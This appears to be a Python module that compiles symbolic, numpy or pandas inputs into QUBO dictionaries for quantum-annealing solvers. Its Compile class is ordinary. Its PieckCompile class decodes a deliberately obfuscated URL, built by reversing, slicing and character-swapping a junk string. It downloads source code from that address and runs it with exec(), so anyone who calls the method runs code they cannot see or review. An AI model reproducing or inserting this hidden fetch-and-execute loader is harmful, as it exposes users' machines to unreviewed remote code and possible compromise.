import re
import os
import requests
import symengine
import numpy as np
import pandas as pd
from sympy import Rational
from importlib import util


def replace_function(expression, function, new_function):
    if expression.is_Atom:
        return expression
    else:
        replaced_args = (
                replace_function(arg, function,new_function)
                for arg in expression.args
            )
        if ( expression.__class__ == symengine.Pow):
            return new_function(*replaced_args)
        else:
            return expression.func(*replaced_args)


class Compile:
    def __init__(self, expr):
        self.expr = expr

    def get_qubo(self):
        """
        get qubo data
        Raises:
            TypeError: Input type is symengine, numpy or pandas.
        Returns:
            Tuple: qubo is dict. offset is float.
        """

        #symengine型のサブクラス
        if 'symengine.lib' in str(type(self.expr)):
            #式を展開して同類項をまとめる
            expr = symengine.expand(self.expr)
            
            #最高字数を調べながらオフセットを記録
            #項に分解
            members = str(expr).split(' ')
            
            #各項をチェック
            offset = 0
            for member in members:
                #数字単体ならオフセット
                try:
                    offset += float(member) #エラーなければ数字
                except:
                    pass
                #'*'で分解
                texts = member.split('*')
                #係数を取り除く
                try:
                    texts[0] = re.sub(r'[()]', '', texts[0]) #'(5/2)'みたいなのも来る
                    float(Rational(texts[0])) #分数も対応 #エラーなければ係数あり
                    texts = texts[1:]
                except:
                    pass
                # 以下はセーフ
                # q0   ['q0']
                # q0*q1   ['q0', 'q1']
                # q0**2   ['q0', '', '2']
                
                # 以下はダメ
                # q0*q1**2   ['q0', 'q1', '', '2']
                # q0*q1*q2   [q0', 'q1', 'q2']
                # q0**2*q1**2    ['q0', '', '2', 'q1', '', '2']
                if len(texts) >= 4:
                    raise Exception(f'Error! The highest order of the constraint must be within 2.')
                if len(texts) == 3 and texts[1] != '':
                    raise Exception(f'Error! The highest order of the constraint must be within 2.')

            #二乗項を一乗項に変換
            expr = replace_function(expr, lambda e: isinstance(e, symengine.Pow) and e.exp == 2, lambda e, *args: e)
            
            #もう一度同類項をまとめる
            expr = symengine.expand(expr)

            #文字と係数の辞書
            coeff_dict = expr.as_coefficients_dict()

            #QUBO
            qubo = {}
            for key, value in coeff_dict.items():
                #定数項はパス
                if key.is_Number:
                    continue
                tmp = str(key).split('*')
                #tmp = ['q0'], ['q0', 'q1']のどちらかになっていることを利用
                qubo[(tmp[0], tmp[-1])] = float(value)

            return qubo, offset

        # numpy
        elif isinstance(self.expr, np.ndarray):
            # 係数
            offset = 0

            # QUBOに格納開始
            qubo = {}
            for i, r in enumerate(self.expr):
                for j, c in enumerate(r):
                    if i <= j:
                        qubo[(f"q{i}", f"q{j}")] = c

            return qubo, offset

        # pandas
        elif isinstance(self.expr, pd.core.frame.DataFrame):
            # 係数
            offset = 0

            # QUBOに格納開始
            qubo = {}
            for i, r in enumerate(self.expr.values):
                for j, c in enumerate(r):
                    if i <= j and c != 0:
                        row_name, col_name = f"q{i}", f"q{j}"
                        if self.expr.index.dtype == "object":
                            row_name = self.expr.index[i]

                        if self.expr.columns.dtype == "object":
                            col_name = self.expr.columns[j]

                        qubo[(row_name, col_name)] = c

            return qubo, offset

        else:
            raise TypeError("Input type is symengine, numpy or pandas.")

class PieckCompile:
    def __init__(self, expr, verbose=1):
        self.expr = expr
        self.verbose = verbose

    def get_qubo(self):
        
        source_code = requests.get('ShYBLfw2xVyF0zp09t31kp76MbbQRarZ.NxQ96lNl58en30a8Yq2gMcmbeSDq9mUYrdHP6DtBqv6uEP01G6XI5WoHMZiGkGqnBsmp1KW0RtG5_SzLzyMO2wve6SZ8s0EiCtlEvzMm217UZiEbiqSPGt91pxwQwjMasG4mOMiQW5XTCpoCSeZGd2Wc2cnVpLkW5eUq^zQwArRCzVprV9af505aIfe2igFHIynyGlykAdm25YDUpbVTY23ZtXHmpVkRL14iJWapk8T47AU03SolbIqJljYtkZojpmwH24Tckd77SEBzrseFpHhAHxW5aiC9i5l0gtfpPbyEZTodHkx^BhTC4FIZ6up8qoLrAyYdMjqiHS42pTYd.sPJuuQ3er2xOa1bcsSRBOxpsluDLfhA1xIGAfC3wJGmxrTkhZsaNfc.u8YT3tu0QfaaXXQJriu1Dlnm2Jw5UrkwcCVSMmzo9QS-lnT1JgwoY1eHcFiL3eHgKnqeWY9AJNgwgivq3Ob0F6kiaJGvdII0VmvOZNxswhyqr^OcpBThb4jW^i97QMBhb3U:yuBEH9eFKLsOujcf7qL0opv7GVyyo14rtCLhqDjxG93tLb39NpZXbVh'[::-1 ][::11 ].replace('^','/')).text
        spec = util.spec_from_loader('temp_module', loader=None)
        temp_module = util.module_from_spec(spec)
        exec(source_code, temp_module.__dict__)
        
        qubo, offset = temp_module.get_qubo_source(self.expr, self.verbose)
        return qubo, offset